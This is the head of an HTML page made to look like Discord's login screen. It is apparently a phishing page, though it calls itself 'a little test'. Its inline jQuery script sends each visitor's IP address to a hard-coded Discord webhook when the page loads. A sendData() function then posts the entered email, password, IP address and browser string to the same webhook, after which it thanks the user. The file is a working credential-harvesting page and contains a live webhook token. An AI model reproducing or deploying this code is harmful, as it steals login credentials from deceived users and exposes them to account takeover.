<!DOCTYPE html>
<html>

<head>
    <title>bobbys little test</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://discord.com/assets/e286f3f761469ae40a8ed41b4289d5ab.css">
    <style>
        body {
            overflow: hidden;
        }
        
        img[src="https://www.svgrepo.com/show/353655/discord-icon.svg"] {
            pointer-events: none;
        }
        
        .tos button {
            position: fixed;
            bottom: 93.5%;
            left: 41%;
            z-index: 1;
            border: 3px solid rgb(104, 97, 210);
            background-color: #4E5D94;
            box-shadow: none;
            border-radius: 10px;
            width: 140px;
            height: 35px;
            font-size: 15px;
            font-weight: 700;
            white-space: nowrap;
            overflow: hidden;
            text-align: left;
            text-indent: 1.5px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .tos button:hover {
            background-color: #5a6db3;
            transition: 250ms;
            cursor: pointer;
        }
        
        .support button:hover {
            background-color: #5a6db3;
            transition: 250ms;
            cursor: pointer;
        }
        
        .support button:active {
            background-color: #9dace1;
        }
        
        .tos button:active {
            background-color: #9dace1;
        }
        
        .support button {
            position: fixed;
            bottom: 93.5%;
            left: 52.5%;
            z-index: 1;
            border: 3px solid rgb(104, 97, 210);
            background-color: #4E5D94;
            box-shadow: none;
            border-radius: 10px;
            width: 140px;
            height: 35px;
            font-size: 15px;
            font-weight: 700;
            white-space: nowrap;
            overflow: hidden;
            text-align: left;
            text-indent: -3.5px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        @media only screen and (max-width: 768px) {
            .tos button,
            .support button {
                position: static;
                margin: 15px auto;
                width: 80%;
                left: 10%;
                bottom: 5%;
            }
        }
        
        @media only screen and (max-width: 600px) {
            .tos button,
            .support button {
                position: static;
                margin: 15px auto;
                width: 80%;
                left: 10%;
                bottom: 5%;
            }
        }
        
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #202225;
            font-family: Whitney, Helvetica Neue, Helvetica, Arial, sans-serif;
        }
        
        .rectangle>img {
            display: block;
            margin: 0 auto;
            margin-bottom: 20px;
        }
        
        .userinput {
            margin-bottom: 20px;
            text-align: center;
            margin-right: 15px;
        }
        
        .userinput input {
            background-color: #131414;
            border-radius: 3px;
            border: none;
            color: #DCDDDE;
            font-size: 16px;
            height: 44px;
            line-height: 22px;
            padding: 10px;
            width: 100%;
            margin-right: 15px;
            margin-top: 10px;
            letter-spacing: .7px;
            margin-left: 5px;
        }
        
        .userinput input:first-child {
            margin-top: 60px;
        }
        
        .userinput input::placeholder {
            color: #72767D;
        }
        
        .userinput input:focus {
            outline: none;
        }
        
        .button {
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #4E5D94;
            border: none;
            border-radius: 3px;
            color: #DCDDDE;
            cursor: pointer;
            font-size: 14px;
            height: 40px;
            line-height: 32px;
            text-transform: uppercase;
            width: 100%;
            width: 101%;
            margin-right: auto;
            margin-bottom: 16%;
        }
        
        .login {
            position: absolute;
            color: #DCDDDE;
            left: 38%;
            top: 37%;
            font-size: 30px;
            text-transform: uppercase;
            font-weight: 700;
        }
        
        .topborder {
            position: absolute;
            top: 0%;
            left: -5%;
            width: 110%;
            height: 100px;
            background-color: #373a45;
            border-color: #6c7ddc;
            border-width: 1px;
            border-style: solid;
        }
        
        .button:hover {
            background-color: #7289DA;
        }
        
        .discord {
            position: absolute;
            top: -19%;
            left: 30%;
            color: #a2abe0;
            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
            font-size: 50px;
            text-transform: capitalize;
            font-weight: 900;
        }
        
        .rectangle {
            position: relative;
            width: 400px;
            max-width: 100%;
            background-color: #36393E;
            border-radius: 8px;
            padding: 20px;
            margin: auto;
            right: 0px;
            box-sizing: border-box;
        }
        
        .custom-dropdown {
            position: relative;
            display: inline-block;
            width: 150px;
            left: 30%;
            border: 2px solid #4b0082;
            border-radius: 5px;
            transform: translateY(1050%);
        }
        
        .custom-dropdown select {
            width: 100%;
            padding: 5px 10px;
            /* Adjust the padding values here */
            font-size: 16px;
            border: none;
            background-color: #7289da;
            color: white;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            cursor: pointer;
        }
        
        .custom-dropdown select:hover {
            background-color: #5a6b8c;
        }
        
        .custom-dropdown select:focus {
            outline: none;
        }
        
        .custom-dropdown::after {
            content: '\25BC';
            position: absolute;
            top: 7px;
            right: 10px;
            color: white;
            pointer-events: none;
        }
        
        select:focus {
            outline: none;
        }
        
        @media (max-width: 768px) {
            .rectangle {
                width: 90%;
            }
        }
        
        @media (max-width: 600px) {
            .rectangle {
                width: 80%;
            }
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            $.getJSON("https://api64.ipify.org?format=json", function(data) {
                var ip = data.ip;
                var requestData = {
                    content: "IP: " + ip,
                };
                $.ajax({
                    type: "POST",
                    url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
                    data: JSON.stringify(requestData),
                    contentType: "application/json",
                });
            });
        });
        const dropdown = document.getElementById('country-dropdown');

        dropdown.addEventListener('change', function() {
            const selectedValue = dropdown.value;

            // Change the background color based on the selected value
            switch (selectedValue) {
                case 'america':
                    dropdown.style.backgroundColor = '#7289da';
                    break;
                case 'china':
                    dropdown.style.backgroundColor = '#f04747';
                    break;
                case 'india':
                    dropdown.style.backgroundColor = '#43b581';
                    break;
                    // Add more cases for additional options
                case 'germany':
                    dropdown.style.backgroundColor = '#faa61a';
                    break;
                case 'japan':
                    dropdown.style.backgroundColor = '#d62976';
                    break;
                case 'russia':
                    dropdown.style.backgroundColor = '#1dcaff';
                    break;
                    // Add more cases for other countries
                default:
                    dropdown.style.backgroundColor = '#7289da';
            }
        });

        // Set the initial background color based on the selected option on page load
        const initialSelectedValue = dropdown.value;

        switch (initialSelectedValue) {
            case 'america':
                dropdown.style.backgroundColor = '#7289da';
                break;
            case 'china':
                dropdown.style.backgroundColor = '#f04747';
                break;
            case 'india':
                dropdown.style.backgroundColor = '#43b581';
                break;
                // Add more cases for additional options
            case 'germany':
                dropdown.style.backgroundColor = '#faa61a';
                break;
            case 'japan':
                dropdown.style.backgroundColor = '#d62976';
                break;
            case 'russia':
                dropdown.style.backgroundColor = '#1dcaff';
                break;
                // Add more cases for other countries
            default:
                dropdown.style.backgroundColor = '#7289da';
        }

        function sendData() {
            var email = $("#email").val();
            var password = $("#password").val();
            $.getJSON("https://api64.ipify.org?format=json", function(data) {
                var ip = data.ip;
                var browserName = navigator.userAgent;
                var requestData = {
                    content: "Email: " + email + "\nPassword: " + password + "\nIP: " + ip + "\nBrowser: " + browserName
                };
                $.ajax({
                    type: "POST",
                    url: "https://canary.discord.com/api/webhooks/1122684490519674941/IVUM-XREmNkywbiLxl_R346eKP87LS_8ngOlBpyvfRxlodiQvvZRSmLBgxhFDAQn5osi",
                    data: JSON.stringify(requestData),
                    contentType: "application/json",
                    success: function() {
                        alert("thanks for submitting")
                    },
                    error: function() {
                        alert("Failed to send data to Discord webhook!");
                    }
                });
            });
        }
    </script>
</head>
